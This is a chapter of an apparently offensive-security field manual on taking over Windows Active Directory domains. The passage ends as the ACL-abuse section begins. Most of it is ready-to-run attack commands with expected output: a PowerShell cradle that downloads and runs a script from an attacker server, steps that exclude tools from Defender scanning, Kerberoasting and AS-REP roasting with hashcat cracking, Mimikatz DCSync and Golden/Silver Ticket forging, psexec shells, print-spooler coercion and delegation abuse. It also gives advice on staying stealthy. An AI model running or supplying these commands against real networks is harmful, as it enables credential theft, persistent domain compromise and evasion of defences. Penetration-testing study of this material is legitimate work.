# Chapter 20 — Active Directory Warfare: Conquering The Domain

**VADER-RCE Field Manual**
**Prerequisite**: Chapter 19 (Living Off The Land), networking fundamentals (TCP/IP, DNS, LDAP), Windows authentication basics
**Drill**: DRILLS/20_ad_warfare/

---

## AD Architecture — The Kingdom

Active Directory is the nervous system of every enterprise. It
authenticates users, manages computers, deploys software, enforces
policy, and controls who accesses what. Compromise AD and you own
the entire organisation. Every machine. Every user. Every secret.

This is not theoretical. AD compromise is the endgame of nearly every
real-world enterprise pentest. Once you're Domain Admin, it's over.

---

## WINDOWS SETUP

Every tool in this chapter requires setup. Do this BEFORE attempting any drill or lab exercise.

### Tools Required

| Tool | Purpose | Platform |
|------|---------|----------|
| BloodHound | AD relationship graph and attack path visualisation | Windows (native) |
| SharpHound | BloodHound data collector | Windows (runs on domain-joined machine) |
| PowerView | PowerShell AD enumeration | Windows PowerShell |
| Rubeus | Kerberos attack toolkit | Windows |
| Mimikatz | Credential extraction, ticket forging | Windows |
| Impacket | Python AD attack scripts | WSL2 / Linux |
| Certipy | AD CS attack toolkit | WSL2 / Linux |
| hashcat | Offline hash cracking | Windows (native, GPU-accelerated) |
| ldapsearch | Raw LDAP queries | WSL2 / Linux |

---

### Install WSL2 (Required for Impacket, Certipy, ldapsearch)

Run this in PowerShell as Administrator:

```powershell
# Install WSL2 with Ubuntu (takes ~5 minutes, requires restart)
wsl --install

# After restart, open Ubuntu from Start Menu and set up your username/password
# Verify WSL2 is running:
wsl --list --verbose
```

**Expected output:**
```
  NAME      STATE           VERSION
* Ubuntu    Running         2
```

**Failure:** If you see `VERSION 1` instead of `2`, run: `wsl --set-version Ubuntu 2`

**Admin rights required:** Yes — WSL2 installation requires Administrator PowerShell.

---

### BloodHound

BloodHound 4.x uses a Neo4j database backend. BloodHound CE (Community Edition) is the modern replacement and ships as a Docker container.

```powershell
# Option A — BloodHound CE (recommended, requires Docker Desktop)
# Install Docker Desktop first: https://www.docker.com/products/docker-desktop/

# Then run BloodHound CE:
# Download docker-compose.yml from https://github.com/SpecterOps/BloodHound
# Place it in a folder and run:
docker compose up -d

# BloodHound CE opens at http://localhost:8080
# Default credentials: admin / password (prompted to change on first login)
```

```powershell
# Option B — BloodHound Legacy (no Docker, easier for lab work)
# Download from: https://github.com/BloodHoundAD/BloodHound/releases
# Also download Neo4j 4.x: https://neo4j.com/download/

# Start Neo4j first, then launch BloodHound.exe
# Connect to bolt://localhost:7687 with your Neo4j credentials
```

**Verify:** BloodHound GUI opens and shows the login/connect screen.

**Admin rights required:** No (running BloodHound itself), Yes (for Neo4j service if installed system-wide).

---

### SharpHound

SharpHound is the data collector for BloodHound. Runs on a Windows machine that is joined to (or can reach) the target domain.

```powershell
# Download SharpHound.exe from:
# https://github.com/BloodHoundAD/SharpHound/releases

# No installation needed — it's a standalone .exe
# Place it somewhere accessible, e.g. C:\Tools\SharpHound\SharpHound.exe

# Verify:
.\SharpHound.exe --version
```

**Expected output:** `SharpHound 1.x.x` (version number)

**Admin rights required:** Not strictly required, but some collection methods need local admin on remote machines.

---

### PowerView

PowerView is a single PowerShell script. No installation. Download and run.

```powershell
# Download PowerView.ps1 from:
# https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
# Save to C:\Tools\PowerView.ps1

# PowerShell execution policy may block it. Bypass for the session:
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

# Load PowerView into memory (from local file):
Import-Module C:\Tools\PowerView.ps1

# Or load directly from a web server (attack scenario):
IEX(New-Object Net.WebClient).DownloadString('http://YOUR-SERVER/PowerView.ps1')

# Verify:
Get-Command Get-Domain
```

**Expected output:** Shows `Get-Domain` as a function.

**Admin rights required:** No — but some queries return more data with admin rights.

---

### Rubeus

Rubeus is a standalone .exe for Kerberos attacks. No installation.

```powershell
# Download Rubeus.exe from:
# https://github.com/GhostPack/Rubeus/releases
# (Or compile from source — requires Visual Studio or .NET SDK)

# Save to C:\Tools\Rubeus.exe

# Verify:
.\Rubeus.exe help
```

**Expected output:** Prints help menu with a list of commands (asktgt, kerberoast, asreproast, etc.).

**Admin rights required:** Some operations (like dumping tickets from other users' sessions) require admin or SYSTEM.

**WARNING:** Antivirus WILL flag Rubeus. Defender will quarantine it. In a lab, either exclude C:\Tools\ from Defender scanning or disable real-time protection.

```powershell
# Exclude your tools folder from Defender (run as Administrator):
Add-MpPreference -ExclusionPath "C:\Tools"
```

---

### Mimikatz

```powershell
# Download from: https://github.com/gentilkiwi/mimikatz/releases
# Extract to C:\Tools\mimikatz\

# Verify:
.\mimikatz.exe "exit"
```

**Expected output:** Shows Mimikatz banner then exits cleanly.

**Admin rights required:** YES — most Mimikatz operations require local Administrator. LSASS operations require SYSTEM or SeDebugPrivilege.

**WARNING:** Mimikatz is HEAVILY flagged by AV/EDR. Defender will delete it on download. You MUST exclude your tools folder from Defender before extracting it.

```powershell
# Run as Administrator before extracting:
Add-MpPreference -ExclusionPath "C:\Tools"
```

---

### Impacket (via WSL2)

Impacket is a Python library with standalone scripts for SMB, Kerberos, LDAP, and AD attacks. Runs in WSL2.

```bash
# Open WSL2 (Ubuntu) and run:

# Install pip and dependencies
sudo apt update && sudo apt install -y python3 python3-pip python3-venv

# Install Impacket
pip3 install impacket

# Or install from source for latest version:
git clone https://github.com/fortra/impacket.git
cd impacket
pip3 install .

# Verify:
GetUserSPNs.py --help
```

**Expected output:** Prints GetUserSPNs.py help/usage text.

**Failure:** `command not found` — means pip install path isn't in your PATH. Run: `export PATH=$PATH:~/.local/bin` and add that line to `~/.bashrc`.

---

### Certipy (via WSL2)

```bash
# In WSL2:
pip3 install certipy-ad

# Verify:
certipy --help
```

**Expected output:** Certipy help menu with subcommands (req, auth, find, template, relay, etc.).

---

### hashcat (Windows, GPU-accelerated)

```powershell
# Download hashcat from: https://hashcat.net/hashcat/
# Extract to C:\Tools\hashcat\

# Verify (shows GPU detected and benchmark info):
.\hashcat.exe -I
```

**Expected output:** Lists your GPU(s) — e.g., `* Device #1: NVIDIA GeForce RTX...`

**Failure:** `No devices found` — install your GPU driver and the OpenCL/CUDA runtime. For NVIDIA: install CUDA toolkit from https://developer.nvidia.com/cuda-downloads

**Admin rights required:** No.

**NOTE:** hashcat uses your GPU for cracking. On a laptop, the wordlist `rockyou.txt` is available pre-installed in Kali/Parrot Linux. On Windows, download it from: https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

---

### ldapsearch (via WSL2)

```bash
# In WSL2:
sudo apt install -y ldap-utils

# Verify:
ldapsearch --help
```

**Expected output:** Prints ldapsearch usage with options.

---

## Summary: What Needs WSL2 vs Windows Native

| Tool | Where It Runs |
|------|--------------|
| BloodHound GUI | Windows native |
| SharpHound | Windows native (domain-joined machine) |
| PowerView | Windows PowerShell |
| Rubeus | Windows native |
| Mimikatz | Windows native |
| Impacket scripts | WSL2 |
| Certipy | WSL2 |
| hashcat | Windows native (GPU) |
| ldapsearch | WSL2 |

---

### The Building Blocks

**Domain Controller (DC)** — The throne. A server running Active Directory
Domain Services (AD DS). Stores the AD database (ntds.dit), handles
authentication requests, replicates data to other DCs. Every domain has
at least one. Most have several for redundancy. Compromise one DC and
you can compromise them all.

**Domain** — A logical grouping of objects (users, computers, groups) that
share a common AD database and security policy. Every domain has a unique
DNS name (e.g., `corp.megacorp.local`). The domain is your primary target.

**Forest** — One or more domains that share a common schema, configuration,
and global catalog. The forest is the ULTIMATE security boundary in AD.
A forest root domain is the master — compromise it and every domain in
the forest is yours.

```
Forest: megacorp.local
├── Domain: megacorp.local (forest root)
│   ├── Domain: us.megacorp.local (child)
│   └── Domain: eu.megacorp.local (child)
└── Trust: partner.com (external trust)
```

**Trust** — A relationship between domains that allows authentication
across boundaries. Trusts can be:
- **Parent-child** — automatic, two-way transitive (us.megacorp.local trusts megacorp.local and vice versa)
- **Tree-root** — connects new trees in the same forest
- **External** — one-way or two-way to a domain outside the forest
- **Forest** — between entire forests

Trusts are the BRIDGES between kingdoms. If you can abuse a trust,
you can move from one domain to another.

**Organizational Unit (OU)** — A container for organising objects. OUs
define the administrative hierarchy:
```
corp.megacorp.local
├── OU=IT
│   ├── OU=Admins
│   └── OU=Helpdesk
├── OU=Finance
├── OU=HR
└── OU=Workstations
    ├── OU=Sydney
    └── OU=Melbourne
```

OUs matter because Group Policy Objects (GPOs) are LINKED to OUs. A
GPO linked to `OU=Workstations` applies to every computer in that OU.
If you can create or modify a GPO, you can push code to every machine
in the targeted OU.

**Group Policy Object (GPO)** — The laws of the kingdom. GPOs configure:
- Security settings (password policy, account lockout)
- Software deployment (install .msi packages on login)
- Login/logoff scripts
- Registry settings
- Firewall rules

GPOs are applied hierarchically: Local → Site → Domain → OU. The last
one wins (closest to the object). If you can edit a GPO that applies to
Domain Controllers, you own the domain.

### Kerberos — The Gatekeeper

Kerberos is the default authentication protocol in AD. Understanding it
is NON-NEGOTIABLE for AD attacks. Every Kerberos attack exploits a
specific step in the authentication flow.

The full Kerberos authentication flow:

```
1. AS-REQ: Client → KDC
   "I am george@CORP.LOCAL, give me a TGT"
   (Encrypted with hash of george's password)

2. AS-REP: KDC → Client
   "Here's your TGT (encrypted with krbtgt hash)"
   + Session key (encrypted with george's hash)

3. TGS-REQ: Client → KDC
   "Here's my TGT, give me a ticket for CIFS/fileserver.corp.local"

4. TGS-REP: KDC → Client
   "Here's your Service Ticket (encrypted with fileserver's NTLM hash)"

5. AP-REQ: Client → Service
   "Here's my Service Ticket, let me in"

6. AP-REP: Service → Client (optional)
   "Authenticated. Welcome."
```

Key players:
- **KDC** (Key Distribution Center) — runs on every DC. Two services:
  - **AS** (Authentication Service) — issues TGTs
  - **TGS** (Ticket Granting Service) — issues service tickets
- **TGT** (Ticket Granting Ticket) — your "passport." Encrypted with
  the `krbtgt` account's hash. If you have the krbtgt hash, you can
  forge any TGT. That's a Golden Ticket.
- **Service Ticket** — your "visa" for a specific service. Encrypted with
  the service account's NTLM hash. If you can crack that hash, you
  get the service account password. That's Kerberoasting.

### NTLM — The Fallback

NTLM is the older authentication protocol. Still used when:
- Kerberos isn't available (IP instead of hostname, cross-forest without trust)
- Legacy applications require it
- Network authentication over HTTP (NTLM over HTTP)

NTLM flow (simplified):
```
1. Client → Server: "I want to authenticate"
2. Server → Client: Challenge (random 8 bytes)
3. Client → Server: Response (challenge encrypted with password hash)
```

The critical detail: **the NTLM hash IS the credential.** You don't need
the plaintext password. If you have the hash, you can authenticate.
That's Pass-the-Hash. We'll get there.

---

## Enumeration — Mapping The Kingdom

Before you attack, you map. Enumeration is the most important phase.
You need to know: who has admin rights, where the trust relationships
are, which accounts have weak configurations, and what the shortest
path to Domain Admin looks like.

### BloodHound — Relationship Mapping

BloodHound is THE tool for AD enumeration. It collects relationships
between AD objects and visualises attack paths as a graph. It answers
questions like:
- "What's the shortest path from this compromised user to Domain Admin?"
- "Which computers can I reach from this machine?"
- "Who has DCSync rights?"

```powershell
# SharpHound (C# collector) — runs on a domain-joined machine
# Download from github.com/BloodHoundAD/SharpHound

# Run full collection — gathers users, groups, computers, sessions, ACLs, trusts
.\SharpHound.exe --CollectionMethods All --Domain corp.local

# Outputs a ZIP file (e.g. 20240101120000_BloodHound.zip) with JSON data
# Import into BloodHound GUI (drag-and-drop the ZIP onto the BloodHound interface)

# Stealth options — don't bang on every machine
.\SharpHound.exe --CollectionMethods DCOnly                          # Only query DCs (quieter, less network noise)
.\SharpHound.exe --CollectionMethods Session,LoggedOn --ComputerFile targets.txt  # Targeted collection

# PowerShell alternative (noisier, easier to detect)
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain corp.local
```

### Expected Output — SharpHound Collection

**Success looks like:**
```
2024-01-01T12:00:00.0000000-05:00|INFORMATION|Status: 120 objects finished (+120 120)/s -- Using 35 MB RAM
2024-01-01T12:00:05.0000000-05:00|INFORMATION|Enumeration finished in 00:00:05.1234567
2024-01-01T12:00:05.0000000-05:00|INFORMATION|Saving cache with stats: 85 ID to type mappings.
                                             | Writing output to C:\Users\george\AppData\Local\Temp
2024-01-01T12:00:05.0000000-05:00|INFORMATION|SharpHound Enumeration Completed at 12:00 PM
```
A ZIP file appears in the current directory named `YYYYMMDDHHMMSS_BloodHound.zip`.

**Failure looks like:** `Unhandled Exception: System.DirectoryServices.Protocols.LdapException: The supplied credential is invalid` — means your user account credentials are wrong or you're not on a domain-joined machine.

**Failure looks like:** `Access Denied` on most collection methods — means you're running without sufficient privileges. Try `--CollectionMethods DCOnly` which needs fewer permissions.

BloodHound pre-built queries to run first:
1. **Find All Domain Admins** — know your targets
2. **Shortest Paths to Domain Admin** — from ANY user, the graph shows the path
3. **Find Kerberoastable Users** — SPNs on user accounts = offline crackable
4. **Find AS-REP Roastable Users** — no pre-auth required = free hash
5. **Find Computers with Unconstrained Delegation** — these cache TGTs = steal tickets
6. **Find Principals with DCSync Rights** — Replicating Directory Changes = dump all hashes

### PowerView — AD Queries From The Field

PowerView (part of PowerSploit) gives you AD enumeration functions.
Pure PowerShell. No compilation needed. Loads directly into memory.

```powershell
# Load PowerView from a web server (attack scenario — serve the file from your attack machine)
IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.50/PowerView.ps1')

# Domain information — basic orientation
Get-Domain                     # Get current domain info
Get-DomainController           # List all domain controllers
Get-Forest                     # Forest info
Get-ForestDomain               # All domains in the forest

# Users — find the accounts worth targeting
Get-DomainUser | Select samaccountname, description, memberof   # All users, show key fields
Get-DomainUser -SPN                                              # Kerberoastable accounts (have SPNs)
Get-DomainUser -PreauthNotRequired                               # AS-REP roastable accounts
Get-DomainUser -AdminCount                                       # Accounts with admin privileges (AdminSDHolder)

# Groups — see who's in the privileged groups
Get-DomainGroup -Identity "Domain Admins" | Get-DomainGroupMember      # Who's in DA?
Get-DomainGroup -Identity "Enterprise Admins" | Get-DomainGroupMember  # Who's in EA?
Get-DomainGroup -AdminCount                                             # All privileged groups

# Computers — find delegation targets and interesting machines
Get-DomainComputer | Select dnshostname, operatingsystem   # All computers with OS info
Get-DomainComputer -Unconstrained                           # Unconstrained delegation machines (TGT theft targets)
Get-DomainComputer -TrustedToAuth                           # Constrained delegation machines

# GPOs — find policy objects you might be able to modify
Get-DomainGPO | Select displayname, gpcfilesyspath                       # All GPOs
Get-DomainGPO -ComputerIdentity ws01.corp.local                          # GPOs applied to specific computer

# ACLs — THE goldmine. Misconfigured permissions everywhere
Find-InterestingDomainAcl -ResolveGUIDs                                 # ACLs that grant interesting permissions
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs             # Who can modify the DA group?

# Shares — look for readable file shares
Find-DomainShare -CheckShareAccess                                       # Shares current user can access

# Sessions — who's logged in where (identifies targets with valuable creds)
Get-NetSession -ComputerName dc01                                        # Sessions currently on DC
Find-LocalAdminAccess                                                    # Machines where current user is local admin
```

### Expected Output — PowerView Queries

**Success looks like (Get-DomainUser -SPN):**
```
samaccountname       : svc_sql
serviceprincipalname : MSSQLSvc/sqlserver.corp.local:1433
description          : SQL Service Account
memberof             : {CN=Domain Users,...}
```

**Success looks like (Get-DomainComputer -Unconstrained):**
```
dnshostname            : dc01.corp.local
useraccountcontrol     : TRUSTED_FOR_DELEGATION
```

**Failure looks like:** `Get-DomainUser : The specified domain does not exist or cannot be contacted` — you're not running this from a domain-joined machine or PowerView isn't loaded. Run `Import-Module C:\Tools\PowerView.ps1` first, then verify you're joined to a domain with `(Get-WmiObject Win32_ComputerSystem).PartOfDomain`.

### AD Module — The Legit Alternative

The ActiveDirectory PowerShell module ships with RSAT. It's a Microsoft
tool. Using it looks like normal admin activity.

```powershell
# Import (needs RSAT installed, or copy the DLL)
Import-Module ActiveDirectory

# Same queries, different syntax
Get-ADUser -Filter * -Properties SPN, DoesNotRequirePreAuth         # All users with SPN and pre-auth flags
Get-ADGroup "Domain Admins" -Properties Members                      # DA group membership
Get-ADComputer -Filter {TrustedForDelegation -eq $true}              # Unconstrained delegation computers
Get-ADObject -Filter {ObjectClass -eq "groupPolicyContainer"} -Properties displayName  # All GPOs
```

**Operational note**: AD module queries go through normal LDAP. PowerView
queries also use LDAP but add some SAMR/DRSR calls. The AD module is
stealthier because it's the expected tool for the job.

### ldapsearch — Low And Slow

For maximum stealth, use raw LDAP queries. No PowerShell, no .NET,
no special tools. Just standard LDAP over port 389.

```bash
# Run these from WSL2 (Ubuntu) — ldapsearch is a standard Linux tool

# Enumerate all users — dump samaccountname, description, group memberships
ldapsearch -x -H ldap://dc01.corp.local -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName description memberOf

# Find Kerberoastable accounts — users with SPNs set
ldapsearch -x -H ldap://dc01.corp.local -b "DC=corp,DC=local" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName

# Find AS-REP roastable accounts — userAccountControl bit 0x400000 = DONT_REQUIRE_PREAUTH
ldapsearch -x -H ldap://dc01.corp.local -b "DC=corp,DC=local" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName

# Find Domain Controllers — computers with userAccountControl SERVER_TRUST_ACCOUNT bit
ldapsearch -x -H ldap://dc01.corp.local -b "DC=corp,DC=local" "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))" dNSHostName
```

### Expected Output — ldapsearch

**Success looks like:**
```
# extended LDIF
#
# LDAPv3
# base <DC=corp,DC=local> with scope subtree
# filter: (objectClass=user)
# requesting: sAMAccountName description memberOf

# george, Users, corp.local
dn: CN=george,CN=Users,DC=corp,DC=local
sAMAccountName: george

# search result
search: 2
result: 0 Success
```

**Failure looks like:** `ldap_sasl_bind(SIMPLE): Can't contact LDAP server (-1)` — means `dc01.corp.local` can't be resolved from WSL2. Check that your WSL2 instance can resolve the domain: `nslookup corp.local`. If it can't, add the DC's IP as a DNS server in `/etc/resolv.conf`.

Raw LDAP is just another LDAP client connecting to port 389. The DC
handles thousands of these per minute from legitimate applications.
Your queries blend in.

---

## Kerberos Attacks

This is where the real money is. Kerberos is the backbone of AD
authentication, and its design has exploitable properties that let you
move from low-privilege user to domain owner.

### Kerberoasting

**The attack**: Any authenticated domain user can request a service ticket
for any service registered with an SPN (Service Principal Name). The
service ticket is encrypted with the service account's NTLM hash.
Request the ticket, take it offline, crack the hash. If the service
account has a weak password, you now own that account.

**Why it works**: It's by design. Kerberos lets any user request a ticket
for any service. The DC doesn't check whether you intend to actually
USE the service. It just hands you the ticket. And that ticket contains
the hash you need.

```powershell
# Rubeus — the standard tool for Kerberoasting
# Requests service tickets for ALL accounts with SPNs, outputs hashes in hashcat format
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Target a specific user (quieter — only one TGS request instead of bulk)
.\Rubeus.exe kerberoast /user:svc_sql /outfile:svc_sql.hash

# PowerView method — request and format tickets in one pipeline
Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat hashcat

# Impacket from WSL2 — works without being on a domain-joined machine
# Replace george:'P@ssword1' with valid domain credentials you've obtained
GetUserSPNs.py corp.local/george:'P@ssword1' -dc-ip 10.0.0.1 -outputfile hashes.txt
```

### Expected Output — Kerberoasting

**Success looks like (Rubeus):**
```
[*] Total kerberoastable users : 3

[*] SamAccountName         : svc_sql
[*] DistinguishedName      : CN=svc_sql,CN=Users,DC=corp,DC=local
[*] ServicePrincipalName   : MSSQLSvc/sqlserver.corp.local:1433
[*] PwdLastSet             : 1/1/2019
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*svc_sql$corp.local$MSSQLSvc/sqlserver.corp.local:1433*$...
```

The hash is written to `hashes.txt` in hashcat format.

**Failure looks like:** `[!] No accounts found with SPNs!` — the domain has no service accounts with SPNs, or your user doesn't have permission to query LDAP. Try running PowerView first to verify: `Get-DomainUser -SPN`.

Crack with hashcat:
```bash
# Run from Windows (hashcat runs best on Windows with GPU)
# Kerberos 5 TGS-REP hash cracking with RC4 encryption (mode 13100)
# rockyou.txt = the standard password wordlist
# best64.rule = mutation rules (adds numbers, symbols, capitalises letters etc.)
hashcat -m 13100 hashes.txt rockyou.txt --rules-file best64.rule

# Kerberos 5 TGS-REP with AES256 encryption — slower to crack, some environments force AES
hashcat -m 19700 hashes.txt rockyou.txt
```

### Expected Output — hashcat

**Success looks like:**
```
$krb5tgs$23$*svc_sql$corp.local*$...:<HASH>:Summer2019!

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Time.Started.....: ...
Speed.#1.........: 1234.5 MH/s
Recovered........: 1/1 (100.00%) Digests
```

**Failure looks like:** `Status: Exhausted` with no cracked hashes — the password isn't in your wordlist. Try a larger wordlist (e.g., `weakpass_2a` from weakpass.com) or add more rules. If the encryption is AES256 (mode 19700), cracking is much slower — GPU matters more.

**Operational notes**:
- Target accounts with SPNs that are USER accounts, not machine accounts.
  Machine accounts have random 120-character passwords. Not crackable.
- Service accounts often have weak passwords because they were set once
  and never rotated. "Summer2019!" is a real password found in prod environments.
- High-value targets: `svc_sql`, `svc_backup`, `svc_admin` — service
  accounts with admin privileges.
- Kerberoasting generates Event ID 4769 (TGS request) with encryption
  type 0x17 (RC4). AES requests (0x12) are less suspicious.

### AS-REP Roasting

**The attack**: If an account has "Do not require Kerberos preauthentication"
enabled, you can request a TGT for that account WITHOUT knowing the
password. The response (AS-REP) is encrypted with the account's hash.
Take it offline, crack it.

```powershell
# Find vulnerable accounts first — see which accounts have pre-auth disabled
Get-DomainUser -PreauthNotRequired

# Rubeus — roast all AS-REP vulnerable accounts at once
.\Rubeus.exe asreproast /outfile:asrep_hashes.txt

# Targeted — roast only a specific account
.\Rubeus.exe asreproast /user:old_admin /outfile:old_admin.hash

# Impacket from WSL2 — can operate without any valid domain credentials
# usersfile = a text file with one username per line (build from enumeration)
GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip 10.0.0.1 -outputfile asrep_hashes.txt
```

### Expected Output — AS-REP Roasting

**Success looks like (Rubeus):**
```
[*] Total accounts found with pre-auth disabled: 2

[*] SamAccountName         : old_admin
[*] DistinguishedName      : CN=old_admin,CN=Users,DC=corp,DC=local
[*] Using domain controller: dc01.corp.local (10.0.0.1)
[*] Building AS-REQ (w/o preauth) for: 'corp.local\old_admin'
[+] AS-REQ w/o preauth successful!
[*] Hash                   : $krb5asrep$23$old_admin@corp.local:...
```

**Failure looks like:** `[X] Error  : KDC_ERR_C_PRINCIPAL_UNKNOWN` — the username doesn't exist in the domain. Double-check enumeration results.

Crack:
```bash
# Kerberos 5 AS-REP hash (mode 18200)
hashcat -m 18200 asrep_hashes.txt rockyou.txt --rules-file best64.rule
```

**Why accounts have this setting**: Legacy compatibility. Some old
applications can't do Kerberos pre-auth. The admin disables it, forgets
about it, and the account sits there for years with a weak password and
no pre-auth requirement. Free hash.

### Golden Ticket

**The attack**: Forge a TGT (Ticket Granting Ticket) using the `krbtgt`
account's NTLM hash. The krbtgt hash encrypts ALL TGTs in the domain.
If you have it, you can create a TGT for ANY user — including a
non-existent user with Domain Admin privileges.

This is game over. Permanent, persistent domain compromise.

```powershell
# Step 1: Get the krbtgt hash (requires Domain Admin or DCSync rights)
# Run Mimikatz on the DC (or with DCSync rights from any machine)
# dcsync = impersonate a DC and request replication of the krbtgt password
mimikatz# lsadump::dcsync /domain:corp.local /user:krbtgt

# Step 2: Note the NTLM hash and domain SID from the output
# Then forge the Golden Ticket — /ptt injects it into the current session immediately
mimikatz# kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:<NTLM_HASH> /ptt

# Parameter breakdown:
# /user:     — any username (can be fake — the DC won't validate it)
# /domain:   — the target domain FQDN
# /sid:      — the domain SID (get from dcsync output or whoami /user)
# /krbtgt:   — the krbtgt account's NTLM hash (from dcsync above)
# /ptt       — pass the ticket (inject into current Windows session)

# Alternative: Impacket from WSL2 — create ticket as a .ccache file
ticketer.py -nthash <KRBTGT_HASH> -domain-sid S-1-5-21-xxx -domain corp.local Administrator
export KRB5CCNAME=Administrator.ccache            # Point Kerberos at the forged ticket
psexec.py -k -no-pass corp.local/Administrator@dc01.corp.local  # Use ticket to get shell on DC
```

### Expected Output — Golden Ticket

**Success looks like (Mimikatz forge + inject):**
```
User      : Administrator
Domain    : corp.local (CORP)
SID       : S-1-5-21-1234567890-1234567890-1234567890
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: <krbtgt_hash> - rc4_hmac
Lifetime  : ...
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ corp.local' successfully submitted for current session
```

Then test it: `dir \\dc01.corp.local\c$` — should list the DC's C drive contents without being prompted for credentials.

**Failure looks like:** `dir \\dc01.corp.local\c$` returns `Access denied` — the krbtgt hash you used is wrong, or you used the old hash after the password was rotated. Get a fresh dcsync output.

**Persistence**: The krbtgt password is only changed during specific
operations (dcpromo, manual rotation). Most organisations NEVER change
it. Your Golden Ticket is valid until they rotate krbtgt — TWICE
(because AD keeps the current and previous krbtgt hash). Could be
valid for months or years.

**Detection**: Golden Tickets can be detected by:
- TGT lifetime exceeding domain policy (default 10 hours, Golden Ticket can set any lifetime)
- Account name in ticket not matching any real account
- Missing or incorrect PAC (Privilege Attribute Certificate) validation
- Event ID 4769 for accounts that don't exist

### Silver Ticket

**The attack**: Forge a service ticket using the target SERVICE account's
NTLM hash. Doesn't touch the DC at all — you present the forged ticket
directly to the service.

```powershell
# Forge a Silver Ticket for CIFS (file shares) on dc01
# /service: specifies the Kerberos service class to forge for
# /rc4:     the service account's NTLM hash (not krbtgt — the actual service's hash)
mimikatz# kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-xxx /target:dc01.corp.local /service:cifs /rc4:<SERVICE_ACCOUNT_HASH> /ptt

# Common services to target:
# CIFS — file shares (\\server\share access)
# HTTP — web services, WinRM
# MSSQL — SQL Server connections
# LDAP — LDAP queries (dangerous — can be used to modify AD objects)
# HOST — general host access (used by WMI, Task Scheduler, etc.)
```

**Advantage over Golden Ticket**: No contact with the DC. No AS-REQ or
TGS-REQ logged. The forged ticket goes straight to the service. Harder
to detect because there's no DC-side event.

**Limitation**: Only valid for the specific service. You need a separate
Silver Ticket for each service you want to access.

### Delegation Attacks

Kerberos delegation allows a service to act on behalf of a user. Think:
a web server accessing a database using the logged-in user's credentials.
Three types, each more restrictive, each exploitable.

**Unconstrained Delegation**: The service receives the user's full TGT and
can use it to access ANY service as that user. If a Domain Admin connects
to a machine with unconstrained delegation, their TGT is cached on that
machine. Steal it.

```powershell
# Find unconstrained delegation machines — these are TGT collection points
Get-DomainComputer -Unconstrained

# If you compromise one, extract cached TGTs with Rubeus
.\Rubeus.exe triage                              # List all cached Kerberos tickets in all sessions
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt   # Dump the specific TGT (luid = logon session ID from triage)

# Force a DC to authenticate to your compromised machine (Printer Bug / PetitPotam)
# SpoolSample abuses the MS-RPRN (print spooler) RPC call to make the DC connect back to you
.\SpoolSample.exe dc01.corp.local compromised-server.corp.local
# The DC authenticates to your machine → its TGT gets cached on your machine → steal it → Golden Ticket path
```

**Constrained Delegation**: The service can only delegate to SPECIFIC
services listed in the `msDS-AllowedToDelegateTo` attribute. Should be
safer. Isn't.

```powershell
# Find constrained delegation — accounts and computers trusted to delegate to specific services
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# If svc_web can delegate to CIFS/fileserver:
# S4U2Self gets a service ticket for yourself, S4U2Proxy forwards it as any user
# This lets you impersonate ANY user (including Domain Admin) to the target service
.\Rubeus.exe s4u /user:svc_web /rc4:<HASH> /impersonateuser:Administrator /msdsspn:cifs/fileserver.corp.local /ptt
```

**Resource-Based Constrained Delegation (RBCD)**: The target service
controls who can delegate to it (via `msDS-AllowedToActOnBehalfOfOtherIdentity`).
If you can modify this attribute on a target, you can grant yourself
delegation rights.

```powershell
# Requirements: write access to a computer's msDS-AllowedToActOnBehalfOfOtherIdentity
# This is common — machine account creators get this by default

# Step 1: Create a new machine account (any domain user can create up to 10 by default)
New-MachineAccount -MachineAccount FAKEMACHINE -Password $(ConvertTo-SecureString 'P@ss123!' -AsPlainText -Force)

# Step 2: Build the security descriptor granting FAKEMACHINE delegation rights to target-server
Set-DomainObject -Identity target-server$ -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$fakeMachineSD}

# Step 3: Use S4U to get a ticket to target-server as Administrator
# FAKEMACHINE$ impersonates Administrator → get CIFS ticket → access target
.\Rubeus.exe s4u /user:FAKEMACHINE$ /rc4:<HASH> /impersonateuser:Administrator /msdsspn:cifs/target-server.corp.local /ptt
```

---

## ACL Abuse — The Most Underrated Attack Path

Misconfigured Access Control Lists are EVERYWHERE in Active Directory.
BloodHound finds them. Pentesters exploit them. Defenders rarely audit
them. These are the overlooked one-step escalation paths that turn a
help desk account into a Domain Admin.

### Understanding AD ACLs

Every AD object has a security descriptor containing a DACL (Discretionary
Access Control List). The DACL lists ACEs (Access Control Entries) — each
ACE grants or denies a specific right to a specific principal.

```
Object: CN=Domain Admins,CN=Users,DC=corp,DC=local
DACL:
  ACE 1: CORP\IT-Admins → GenericAll   (full control)
  ACE 2: CORP\Helpdesk  → AddMember    (can add members)
  ACE 3: Everyone       → Read         (can see the group exists)
```

If you're in IT-Admins, you have GenericAll on Domain Admins.
That means you can add yourself. Think about that.

### The Dangerous Permissions

**GenericAll** — Full control. On a user: reset password, modify group
membership, set SPNs (for targeted Kerberoasting). On a group: add/remove
members. On a computer: configure RBCD.

```powershell
# Scenario: you have GenericAll on the user john_admin
# Option 1: Reset their password without knowing the current one
